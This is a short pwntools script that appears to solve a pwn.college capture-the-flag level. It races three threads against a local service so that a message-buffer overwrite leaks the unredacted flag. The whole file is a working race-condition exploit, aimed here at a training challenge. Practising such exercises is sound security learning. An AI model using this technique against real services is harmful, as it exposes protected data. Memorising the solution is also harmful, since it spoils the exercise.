# Level9
import threading

import pwn

MESSAGE_LENGTH = 69
OVERWRITE_MESSAGE = b"." * MESSAGE_LENGTH


def send_redacted_flag_thread(found: threading.Event) -> None:
    with pwn.remote("127.0.0.1", 1337, level="error") as io:
        while not found.is_set():
            io.sendline(b"send_redacted_flag")


def send_message_thread(found: threading.Event) -> None:
    with pwn.remote("127.0.0.1", 1337, level="error") as io:
        while not found.is_set():
            io.sendline(b"send_message")
            io.sendline(OVERWRITE_MESSAGE)


def recv_message_thread(found: threading.Event) -> None:
    with pwn.remote("127.0.0.1", 1337, level="error") as io:
        while not found.is_set():
            io.sendline(b"receive_message")
            data = io.recvline_startswith(b"Message: ").decode(errors="ignore")
            if "pwn.college{" in data:
                print(data)
                found.set()


def ctf() -> None:
    found = threading.Event()

    threads = [
        threading.Thread(target=send_redacted_flag_thread, args=(found,)),
        threading.Thread(target=send_message_thread, args=(found,)),
        threading.Thread(target=recv_message_thread, args=(found,)),
    ]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    ctf()
